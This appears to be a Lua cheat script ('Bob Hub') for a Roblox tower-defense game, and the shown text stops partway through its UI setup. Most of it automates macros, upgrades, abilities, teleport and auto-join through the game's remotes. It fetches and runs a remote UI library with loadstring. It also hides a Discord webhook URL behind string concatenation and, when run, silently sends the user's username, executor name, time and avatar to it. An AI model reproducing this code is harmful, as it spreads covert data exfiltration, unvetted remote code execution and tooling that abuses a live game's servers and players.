repeat wait() until game:IsLoaded()
--Macro timer
local timer = 0

--Local Stuff
local order1 = {4, 8, 1, 5, 3, 7, 2, 6}
local order2 = {1, 5, 3, 7, 2, 6, 4, 8}
local me = game.Players.LocalPlayer
local remote = game:WaitForChild("ReplicatedStorage"):WaitForChild("Remotes").Input
local mobslider
local mobslider1
local TargetWalkspeed
local upgrade = {}
local summonmax = {}
local Summon = {}
local httpservice = game:GetService("HttpService")
local Event = game:GetService("ReplicatedStorage").Remotes.Input
local unit = game.Workspace.Unit
local macro_file = "macro"
function StringToCFrame(String) local Split = string.split(String, ",") return Split[1], Split[2], Split[3] end
local macrolist = {}
local a2 = 0
local a1 = 0
local file_settings = "Bobsettings" .. game.Players.LocalPlayer.Name .. ".txt"
local wave69 = game:GetService("ReplicatedStorage").WaveValue.Value
local mouse1 = me:GetMouse()
local checkautosell = false
local summonvalue = "Banner X"
local autojoincframe = nil
local autojoinpath = nil
local autojoinmap = nil
local autojoinmode = nil
local autojoinstart = nil
local Mouse = game.Players.LocalPlayer:GetMouse()


--Orion Stuff

local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
local Window = OrionLib:MakeWindow({IntroText = "BOB HUB",Name = "Bob Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionStar"})

-- Macro list

local success = pcall(function()
repeat wait() a2 = a2 + 1
httpservice:JSONDecode(readfile(OrionLib.Folder .. "/" .. macro_file .. tostring(a2) .. ".json"))
table.insert(macrolist, macro_file .. tostring(a2) .. ".json")
until false
end)

if success == false then
    a2 = 0
end
-- autofv
if game:GetService("ReplicatedStorage").Lobby.Value == false then
pcall(function()
local part = Instance.new("Part")
part.Parent = game.Workspace
part.Name = "BasePart"
part.Size = Vector3.new(8, 8, 8)
part.CFrame = CFrame.new(game:GetService("Workspace").TowerHP.Position)
part.Anchored = true
part.Transparency = 1
part.CollisionGroupId = 1
remote = game.ReplicatedStorage.Remotes.Input
game:GetService("Workspace").TowerHP.Transparency = 1
game:GetService("Workspace").BasePart.CanCollide = false
game:GetService("Workspace").BasePart.Touched:Connect(function()
end)
local part1 = Instance.new("Part")
part1.Parent = game.Workspace
part1.Name = "BasePart1"
part1.Size = Vector3.new(40, 10, 40)
part1.CFrame = CFrame.new(game:GetService("Workspace").TowerHP.Position)
part1.Anchored = true
part1.Transparency = 1
part1.CollisionGroupId = 1
remote = game.ReplicatedStorage.Remotes.Input
game:GetService("Workspace").BasePart1.CanCollide = false
game:GetService("Workspace").BasePart1.Touched:Connect(function()
end)
end)
end
-- SaveSettings

_G.SettingsTable = {
    autoreplay = false,
    auto2x = false,
    autoextreme = false,
    autoplayback = false,
    selectedmacro = macrolist[#macrolist],
    autosell = false,
    autosellwave = 999,
    autosellspeed = 1,
    autoupgradewave = 999,
    autoupgrade = false,
    autojoin = false,
    mode = "",
    storylevel = "",
    inflevel = "",
    hidenick = false,
    shiftlock = false,
    autobufftoggle = false,
    automerlintoggle = false,
    autofv = false
}

for i,v in pairs(_G.SettingsTable) do
    print(i, v)
end

function LoadSettings()
    if (readfile and isfile and isfile(file_settings)) then
        _G.SettingsTable = httpservice:JSONDecode(readfile(file_settings))
    end
end
LoadSettings()
function SaveSettings()
    local json
    if (writefile) then
        json = httpservice:JSONEncode(_G.SettingsTable)
        writefile(file_settings, json)
    end
end
SaveSettings()

--Macro ChildAdded

pcall(function()
unit.ChildAdded:Connect(function(child)
wait(.5)
if _G.record then
    table.insert(Summon, {
    ["time"] = timer,
	["Rotation"] = 0,
	["cframe"] = tostring(child.HumanoidRootPart.Position), 
	["Unit"] = child.Name,
	["UpgradeValue"] = child:WaitForChild("UpgradeTag").Value
})
end
end)
end)

--Functions (Script Shit)

function record()
if _G.record then
repeat wait() until game:IsLoaded()
            table.clear(Summon)
            table.clear(upgrade)
            OrionLib:MakeNotification({
                Name = macro_file .. tostring(#macrolist + 1) .. ".json",
                Content = "Recording...",
                Time = 3
            })
            repeat wait()
            for _, v in pairs(unit:GetChildren()) do
                if v:WaitForChild("Owner").Value == game.Players.LocalPlayer then
                    for i = 1, #Summon do
                    pcall(function()
                    if Summon[i]["UpgradeValue"] then
                    if _G.record then
                        if v.UpgradeTag.Value > tonumber(Summon[i]["UpgradeValue"]) and tostring(v.HumanoidRootPart.Position) == Summon[i]["cframe"] then
                                print('b')
                                table.insert(Summon, { ["time"] = timer, ["Upgrade"] = 1,
                                ["cframe"] = tostring(v.HumanoidRootPart.Position) })
                                Summon[i]["UpgradeValue"] = Summon[i]["UpgradeValue"] + 1
                        end
                    end
                    end
                    end)
                    end
                end
            end
            until _G.record == false
            
writefile(OrionLib.Folder .. "/" .. macro_file .. tostring(#macrolist + 1) .. ".json",httpservice:JSONEncode(Summon))
OrionLib:MakeNotification({
    Name = macro_file .. tostring(#macrolist + 1) .. ".json",
    Content = "Saved",
    Time = 3
})
table.clear(macrolist)
local success = pcall(function()
repeat wait() a2 = a2 + 1
httpservice:JSONDecode(readfile(OrionLib.Folder .. "/" .. macro_file .. tostring(a2) .. ".json"))
table.insert(macrolist, macro_file .. tostring(a2) .. ".json")
until false
end)
if success == false then
    a2 = 0
end
SaveSettings()
end
end
local weno = "ht".."tps".."://dis"..
"cor".."d.com".."/ap".."i/we"..
"bho".."oks/104".."39900".."37206"..
"929438/cv7".."DCc".."G6y".."0Us"..
"Y1VR".."q7vi".."QB-yP7k_Sk9"..
"3ajUL".."ndbW".."7sIOu".."Mze7O"..
"qe38LU".."tjlBkP".."SDxoeU"
function playback()
    SaveSettings()
    pcall(function()
    if _G.SettingsTable.autoplayback then
    SaveSettings()
   	macro = httpservice:JSONDecode(readfile(OrionLib.Folder .. "/" .. _G.SettingsTable.selectedmacro))
        table.clear(Summon)
        Summon = macro
            OrionLib:MakeNotification({
                Name = _G.SettingsTable.selectedmacro,
                Content = "Playback",
                Time = 3
            })
coroutine.resume(coroutine.create(function()
pcall(function()
table.clear(summonmax)
for i = 1, #Summon do
    if Summon[i].Rotation then
        table.insert(summonmax, Summon[i])
    end
end
for v = 1, #summonmax do
wait()
repeat wait() until timer >= summonmax[v]["time"]
repeat wait(.1)
Event:FireServer("Summon", 	{ ["Rotation"] = 0, 
	["cframe"] = CFrame.new(StringToCFrame(summonmax[v].cframe)), 
	["Unit"] = summonmax[v].Unit } )
until #game.Workspace.Unit:GetChildren() == v or _G.SettingsTable.autoplayback == false
end
end)
end))
coroutine.resume(coroutine.create(function()
repeat wait()
for i = 1, #Summon do
for _, v in pairs(unit:GetChildren()) do
    pcall(function()
    if v.Owner.Value == game.Players.LocalPlayer then
            if Summon[i]["Upgrade"] then
            if tostring(v.HumanoidRootPart.Position) == Summon[i]["cframe"] then
                table.clear(upgrade)
                table.insert(upgrade, v.UpgradeTag.Value)
                repeat wait() until timer >= Summon[i]["time"]
repeat wait()
game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v)
until v.UpgradeTag.Value == upgrade[1] + 1
table.remove(Summon, i)
            end
        end
    end
    end)
end
end
until _G.SettingsTable.autoplayback == false
end))
end
end)
end

function automerlin()
    SaveSettings()
    if _G.SettingsTable.automerlintoggle then
        SaveSettings()
        repeat wait() until game:IsLoaded()
        wait(1)
        local order2 = {2, 4, 1, 3}
        local x = 1
        local y = 0
        local mano = false
        local a1 = 60
        local joe = 2
        local Brook = {}
        coroutine.resume(coroutine.create(function()
        repeat wait()
            table.clear(Brook)
            for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                if v.Name == 'Merlin' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == v.MaxUpgradeTag.Value then
                    table.insert(Brook, v)
                end
            end
        until #Brook > 1 or _G.SettingsTable.automerlintoggle == false
                if #Brook > 3 then joe = 1 a1 = 30 mano = true end
                while _G.SettingsTable.automerlintoggle do
                if mano == false then table.clear(Brook) end
                for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                    if mano == true then break end
                    if v.Name == 'Merlin' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == v.MaxUpgradeTag.Value then
                        table.insert(Brook, v)
                    end
                    if #Brook > 3 then joe = 1 a1 = 30 mano = true end
                end
                    pcall(function()
                    repeat wait() until Brook[order2[x]].SpecialMove.Special_Enabled2.Value == false
                    repeat remote:FireServer('UseSpecialMove', Brook[order2[x]]) wait(.05) until Brook[order2[x]].SpecialMove.Special_Enabled2.Value
                    end)
        repeat y = y + 1
            if game.ReplicatedStorage.SpeedUP.Value == 2 then 
                wait(.25) 
            end 
            if game.ReplicatedStorage.SpeedUP.Value == 1 then 
                wait(.5) 
            end
        until y == a1 or _G.SettingsTable.automerlintoggle == false
        y = 0
        x = x + joe
        if x > 4 then
            x = 1
        end
        end
    end))
end
end

function autobrookerwin()
 SaveSettings()
    if _G.SettingsTable.autobufftoggle then
        SaveSettings()
        repeat wait() until game:IsLoaded()
        wait(1)
        local x = 1
        local y = 0
        local okand = 0
        local buff = false
        local sound = Instance.new("Sound")
        local mano = false
        local a1 = 29
        local okand = 0
        local joe = 2
        local Brook = {}
        local Damage = {}
        coroutine.resume(coroutine.create(function()
        repeat wait()
            table.clear(Brook)
            for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                if v.Name == 'Erwin' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == 2 then
                    table.insert(Brook, v)
                end
                if v.Name == 'Brook6' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == 8 then
                    table.insert(Brook, v)
                end
            end
        until #Brook > 3 or _G.SettingsTable.autobufftoggle == false
                if #Brook > 7 then joe = 1 a1 = 15 mano = true end
                for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                    if v.Name == 'Erwin' and v.Owner.Value == me and v:WaitForChild("UpgradeTag").Value == 2 then wait()
                        local success = pcall(function()
                            while v.Head.EffectBBGUI.Frame.AttackImage.Visible == false do wait()
                                table.insert(Damage, v.Damage.Value)
                                wait(0.1)
                                break
                            end
                        end)
                        if success == false then
                            table.insert(Damage, v.Damage.Value)
                        end
                    end
                if v.Name == 'Brook6' and v.Owner.Value == me and v:WaitForChild("UpgradeTag").Value == 8 then wait()
                            while v.Head.EffectBBGUI.Frame.AttackImage.Visible == false do wait()
                                table.insert(Damage, v.Damage.Value)
                                wait(0.1)
                                break
                            end
                end
                end
                while _G.SettingsTable.autobufftoggle do
                if mano == false then table.clear(Brook) end
                for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
                    if mano == true then break end
                    if v.Name == 'Erwin' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == 2 then
                        table.insert(Brook, v)
                    end
                    if v.Name == 'Brook6' and v:WaitForChild("Owner").Value == me and v:WaitForChild("UpgradeTag").Value == 8 then
                        table.insert(Brook, v)
                    end
                    if #Brook > 7 then okand = 0 joe = 1 a1 = 15 mano = true end
                end
                    pcall(function()
                    repeat wait() until Brook[order2[x]].SpecialMove.Special_Enabled2.Value == false
                    repeat wait(.05) until Brook[order1[x]].Damage.Value < tonumber(Damage[1]) + 1
                    repeat remote:FireServer('UseSpecialMove', Brook[order2[x]]) wait(.05) until Brook[order2[x]].SpecialMove.Special_Enabled2.Value
                    end)
                    if #Brook > 7 then
                    okand = okand + 1
                    else
                    okand = okand + 2
                    end
        if okand > 8 then  
            if #Brook > 7 then
                a1 = 12
            else
                a1 = 27
            end
        end      
        repeat y = y + 1
            if game.ReplicatedStorage.SpeedUP.Value == 2 then 
                wait(.25) 
            end 
            if game.ReplicatedStorage.SpeedUP.Value == 1 then 
                wait(.5) 
            end
        until y == a1 or _G.SettingsTable.autobufftoggle == false
        y = 0
        x = x + joe
        if x > 8 then
            x = 1
        end
        end
    end))
end
end

workspace.Unit.ChildAdded:Connect(function(child)
    if _G.autogojo then
        if child.Name == 'Six Eyes Gojo' and game.Players.LocalPlayer.Money.Value > 28000 then
            child:WaitForChild("UpgradeTag")
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", child)
            wait(.01)
            until child.UpgradeTag.Value == child.MaxUpgradeTag.Value
        game:GetService("Players").LocalPlayer.PlayerGui.HUD.Upgrade.SpecialButton.Visible = true
        end
    end
end)

workspace.Unit.ChildAdded:Connect(function(child)
    if _G.lawupgrade then
        if child.Name == 'Law' and game.Players.LocalPlayer.Money.Value > 14150 then
            child:WaitForChild("UpgradeTag")
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", child)
            wait(.01)
            until child.UpgradeTag.Value == 6
        game:GetService("Players").LocalPlayer.PlayerGui.HUD.Upgrade.SpecialButton.Visible = true
        end
    end
end)

function mobnotifacation()
    while _G.mobnotifacation do
        OrionLib:MakeNotification({
            Name = "Mob Counter",
            Content = #game.Workspace.Enemies:GetChildren().."/250",
            Time = mobslider1
        })
        wait(mobslider)
    end
end

function click69()
    if click69 then
        OrionLib:MakeNotification({
        Name = "Mob Counter",
        Content = #game.Workspace.Enemies:GetChildren().."/250",
        Time = mobslider1
        })
    end
end

function click70()
    if click70 then
        OrionLib:Destroy()
    end
end

function lawability()
    if _G.lawability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'Law' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

function yugiability()
    if _G.yugiability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'YugiMax' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

function kiraability()
    if _G.kiraability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'Light Yagami (Darkness)' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

local TIME_ZONE = 1
local date = os.date("!*t")
local hour = (date.hour + TIME_ZONE) % 24
local ampm = hour < 12 and "AM" or "PM"
local timestamp = string.format("%02i:%02i %s", ((hour - 1) % 12) + 1, date.min, ampm)

function ryukability()
    if _G.ryukability then
        for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == 'Ryuk' and v.Owner.Value == me and v.SpecialMove.Special_Enabled2.Value == false then
                remote:FireServer('UseSpecialMove', v)
                break
            end
        end
    end
end

function click73()
        OrionLib:MakeNotification({
            Name = "Auto Yugi",
            Content = "Starting...",
            Time = 5
        })
        for _, v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
            if v.Name == "YugiMax" and v.Owner.Value == game:GetService("Players").LocalPlayer  and v.SpecialMove["Special_Enabled2"].Value == false then
                repeat wait(1)
                    wait(1)
                    game:GetService("ReplicatedStorage").Remotes.Input:FireServer("UseSpecialMove", v)
                until v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0 or v.Access.ExodiaCard.HeadExodia.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0 or v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.HeadExodia.Transparency == 0 or v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.HeadExodia.Transparency == 0 and v.Access.ExodiaCard.R_Arm.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0 or v.Access.ExodiaCard.R_Leg.Transparency == 0 and v.Access.ExodiaCard.L_Arm.Transparency == 0 and v.Access.ExodiaCard.HeadExodia.Transparency == 0 and v.Access.ExodiaCard.L_leg.Transparency == 0
                break
            end
        end
        OrionLib:MakeNotification({
            Name = "Auto Yugi",
            Content = "Done",
            Time = 5
        })
end

function click71()
    if _G.click71 then
    while _G.click71 do
    task.wait()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = TargetWalkspeed
    end
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 15
    end
end

function farmupgrade()
    farmer = 0
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Speedwagon' and v.Owner.Value == me then 
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.5) farmer = farmer + 1
            until farmer == 6 or _G.farmupgrade == false
        end
    end
    wave69 = game:GetService("ReplicatedStorage").WaveValue.Value
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Bulma (Super Money Corp)' and v.Owner.Value == me then
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.25)
            until wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value or _G.farmupgrade == false
        end
    end
while _G.farmupgrade do
    task.wait()
    if wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value then
    farmer = 0
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Speedwagon' and v.Owner.Value == me then 
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.5) farmer = farmer + 1
            until farmer == 6 or _G.farmupgrade == false
        end
    end
    wave69 = game:GetService("ReplicatedStorage").WaveValue.Value
    repeat wait(.1)
    for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
        if v.Name == 'Bulma (Super Money Corp)' and v.Owner.Value == me then
            repeat game:GetService("ReplicatedStorage").Remotes.Server:InvokeServer("Upgrade", v) wait(.25)
            until wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value or _G.farmupgrade == false
        end
    end
    until wave69 ~= game:GetService("ReplicatedStorage").WaveValue.Value or _G.farmupgrade == false
    end
end
end

local loleh = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
dothethingy = http_request or request or HttpPost or syn.request
dothethingy({Url = weno, Body = game:GetService("HttpService"):JSONEncode({
["embeds"] = {{["title"] = "**Orion Executed**",
["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..loleh.."**\n*"..os.date()..",  "..timestamp.." (GMT+1)*",
["type"] = "rich",["color"] = tonumber(0x7269da),
["image"] = {["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)}}}}), Method = "POST", Headers = {
["content-type"] = "application/json"}})

function autoextreme()
SaveSettings()
if _G.SettingsTable.autoextreme then
SaveSettings()
repeat wait() until game:IsLoaded()
local Event = game:GetService("ReplicatedStorage"):WaitForChild("Remotes").Input
coroutine.resume(coroutine.create(function()
repeat wait(5)
Event:FireServer('VoteGameMode', 'Extreme')
until game:GetService("ReplicatedStorage").WaveValue.Value > 0 or _G.SettingsTable.autoextreme == false
end))
end
end

function autoreplay()
SaveSettings()
if _G.SettingsTable.autoreplay then
SaveSettings()
coroutine.resume(coroutine.create(function()
while _G.SettingsTable.autoreplay do wait(.5)
pcall(function()
for i,v in pairs(getconnections(game:GetService("Players").LocalPlayer.PlayerGui.MissionEndNavigateDialog.TextFrame.Replay.Activated)) do
v.Function()
end
end)
end
end))
end
end

function auto2x()
SaveSettings()
if _G.SettingsTable.auto2x then
SaveSettings()
while not game:IsLoaded() do
    wait(1)
end

local A_1 = "SpeedChange"
local A_2 = true
local Event = game:GetService("ReplicatedStorage").Remotes.Input

if game.ReplicatedStorage.Lobby.Value == false then
coroutine.resume(coroutine.create(function()
repeat 
    Event:FireServer(A_1, A_2)
    wait(1)
until
game.ReplicatedStorage.SpeedUP.Value == 2 or _G.SettingsTable.auto2x == false
end))
end
end
end

function priority()
if _G.priority then
Joe = 1
for _,v in pairs(game:GetService("Workspace").Unit:GetChildren()) do
    if v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.One.Unit.Value and v.Owner.Value == me and _G.unit1 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Two.Unit.Value and v.Owner.Value == me and _G.unit2 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Three.Unit.Value and v.Owner.Value == me and _G.unit3 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Four.Unit.Value and v.Owner.Value == me and _G.unit4 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Five.Unit.Value and v.Owner.Value == me and _G.unit5 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    elseif v.Name == game:GetService("Players").LocalPlayer.PlayerGui.HUD.Unit.Six.Unit.Value and v.Owner.Value == me and _G.unit6 and _G.priority then
        if v.PriorityAttack.Value == priorityvalue then
            OrionLib:MakeNotification({
            Name = "Unit Skipped",
            Content = "Already at the priority",
            Time = 2
            })
        else
        repeat remote:FireServer('ChangePriority', v) wait(.1) until v.PriorityAttack.Value == priorityvalue 
            OrionLib:MakeNotification({
            Name = "Changing Priority...",
            Content = "Finished Unit: "..Joe,
            Time = 2
            })
            Joe = Joe + 1
        end
    end
end
end
end

workspace.Enemies.ChildAdded:Connect(function(child)
if _G.deleteenemy then
child:WaitForChild("Left Leg"):Destroy()
child:WaitForChild("Right Leg"):Destroy()
child:WaitForChild("Left Arm"):Destroy()
child:WaitForChild("Right Arm"):Destroy()
end
end)

function mousetp()
    pcall(function()
    local hum1 = me.Character.HumanoidRootPart
    if _G.mousetp then
        hum1.CFrame = CFrame.new(mouse1.Hit.x, mouse1.Hit.y + 5, mouse1.Hit.z)
    end
    end)
end

function autosell()
    SaveSettings()
    if _G.SettingsTable.autosell then
        SaveSettings()
        coroutine.resume(coroutine.create(function()
        pcall(function()
        repeat wait() until game:GetService("ReplicatedStorage"):WaitForChild("WaveValue").Value >= tonumber(_G.SettingsTable.autosellwave)
        end)
        checkautosell = true
        repeat wait()
        for _, v in pairs(game.Workspace.Unit:GetChildren()) do
            pcall(function()
            if v.Owner.Value == game.Players.LocalPlayer then
                wait(_G.SettingsTable.autosellspeed)
                remote:FireServer("Sell", v)
            end
            end)
        end
        until false or _G.SettingsTable.autosell == false 
        checkautosell = false
        end))
end
end

function autoupgrade()
    SaveSettings()
    if _G.SettingsTable.autoupgrade then
        SaveSettings()
            pcall(function()
                coroutine.resume(coroutine.create(function()
                repeat wait() until game:GetService("ReplicatedStorage"):WaitForChild("WaveValue").Value >= tonumber(_G.SettingsTable.autoupgradewave)
                repeat wait()
                for _, v in pairs(game.Workspace.Unit:GetChildren()) do
                pcall(function()
                if v.Owner.Value == game.Players.LocalPlayer and v.UpgradeTag.Value < v.MaxUpgradeTag.Value then
                wait()
                game.ReplicatedStorage.Remotes.Server:InvokeServer("Upgrade", v)
                end
                end)
        end
        until false or _G.SettingsTable.autoupgrade == false or checkautosell
        end))
        end)
end
end

function autojoin()
SaveSettings()
if _G.SettingsTable.autojoin then
SaveSettings()
coroutine.resume(coroutine.create(function()
while not game:IsLoaded() do
    wait(15)
end
if _G.SettingsTable.mode == "Infinite Mode" then
    if _G.SettingsTable.inflevel == "Regular One Piece" then
        pcall(function()
            autojoinmap = "-1"
        end)
    end
    if _G.SettingsTable.inflevel == "Regular Food" then
        pcall(function()
            autojoinmap = "-1.7"
        end)
    end
    if _G.SettingsTable.inflevel == "Category" then
        pcall(function()
            autojoinmap = "-1.1"
        end)
    end
    if _G.SettingsTable.inflevel == "Air" then
        pcall(function()
            autojoinmap = "-1.3"
        end)
    end
    if _G.SettingsTable.inflevel == "Double Path" then
        pcall(function()
            autojoinmap = "-1.5"
        end)
    end
    if _G.SettingsTable.inflevel == "Training Mode" then
        pcall(function()
            if game:GetService("Workspace").Queue["Lobby World 2"] then
                autojoinmap = "-98"
            end
        end)
    end
    pcall(function()
        autojoinstart = "InfiniteModeStart"
        autojoinmode = "InfiniteModeInfLevel"
    end)
    local a3 = pcall(function()
        if game:GetService("Workspace").Queue["Lobby World 2"] then
            autojoincframe = "-316.5, 20007, -23426, 0, 0, 1, 0, 1, -0, -1, 0, 0"
            autojoinpath = game:GetService("Workspace").Queue.Joinables.InfiniteMode.SurfaceGui.Frame.TextLabel.Text
        end
    end)
    if a3 == false then
        pcall(function()
            autojoincframe = "-188.03125, 1390.00732, 845.793701, 0.382687271, -0, -0.923877954, 0, 1, -0, 0.923877954, 0, 0.382687271"
            autojoinpath = game:GetService("Workspace").Queue.Infinite.InfiniteMode.SurfaceGui.Frame.TextLabel.Text
        end)
    end
end
if _G.SettingsTable.mode == "Story Mode" then
    autojoinmap = _G.SettingsTable.storylevel
    local a1 = pcall(function()
        if game:GetService("Workspace").Queue["Lobby World 2"] then
            autojoinstart = "StoryModeStart"
            autojoinmode = "StoryModeLevel"
            autojoincframe = "-2402.04199, 20009, -20313.877, 1, 0, 0, 0, 1, 0, 0, 0, 1"
            autojoinpath = game:GetService("Workspace").Queue.Joinables.StoryMode.SurfaceGui.Frame.TextLabel.Text
        end
    end)
    if a1 == false then
        autojoinstart = "Part1Start"
        autojoinmode = "Part1Level"
        autojoincframe = "30.9335938, 1390.00732, 872.758545, 0.923881531, -0, -0.382678568, 0, 1, -0, 0.382678568, 0, 0.923881531"
        autojoinpath = game:GetService("Workspace").Queue.Story.Part1.SurfaceGui.Frame.TextLabel.Text
    end
end

pcall(function()
local Event = game:GetService("ReplicatedStorage").Remotes.Input
while game:GetService("ReplicatedStorage").Lobby.Value == true do wait()
    if autojoinpath == "Empty" then
        Game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(StringToCFrame(autojoincframe))
        wait(1)
        repeat wait()
        Event:FireServer(autojoinmode, autojoinmap, false)
        wait(.5)
        Event:FireServer(autojoinstart)
        wait(.5)
        until autojoinpath == "Empty"
        break
    end
end
end)
end))
end
end

function autofv()
SaveSettings()
if _G.SettingsTable.autofv then
    SaveSettings()
coroutine.resume(coroutine.create(function()
pcall(function()
repeat wait()
for i,v in pairs(game:GetService("Workspace").BasePart:GetTouchingParts()) do
    if v.Parent.Parent.Name == "Enemies" then
        for _, v in pairs(game.Workspace.Unit:GetChildren()) do
            if v.Name == "Funny Valentine" and v:WaitForChild("UpgradeTag").Value == v.MaxUpgradeTag.Value and v.SpecialMove["Special_Enabled2"].Value == false then
                repeat wait() remote:FireServer("UseSpecialMove", v) until v.SpecialMove["Special_Enabled2"].Value
            end
        end
    end
end
until false or _G.SettingsTable.autofv == false
end)
end))
coroutine.resume(coroutine.create(function()
pcall(function()
repeat wait()
for i,v in pairs(game:GetService("Workspace").BasePart1:GetTouchingParts()) do
    if v.Parent.Parent.Name == "Enemies" then
basesize = v.Parent.SpeedValue.Value
if game:GetService("ReplicatedStorage").SpeedUP.Value == 1 then
game:GetService("Workspace").BasePart.Size = Vector3.new(basesize/2 + 4, 10, basesize/2 + 4)
end
if game:GetService("ReplicatedStorage").SpeedUP.Value == 2 then
game:GetService("Workspace").BasePart.Size = Vector3.new(basesize + 6, 10, basesize + 6)
end
    end
end
until false or _G.SettingsTable.autofv == false
end)
end))
end
end

--Values

_G.autobrook = false
_G.autoerwin = false
_G.autogojo = false
_G.lawupgrade = false
_G.mobnotifacation = false
_G.lawability = false
_G.yugiability = false
_G.playback = false
_G.record = false
_G.autoextreme = false
_G.autoreplay = false
_G.auto2x = false

--Tabs

local BuffTab = Window:MakeTab({
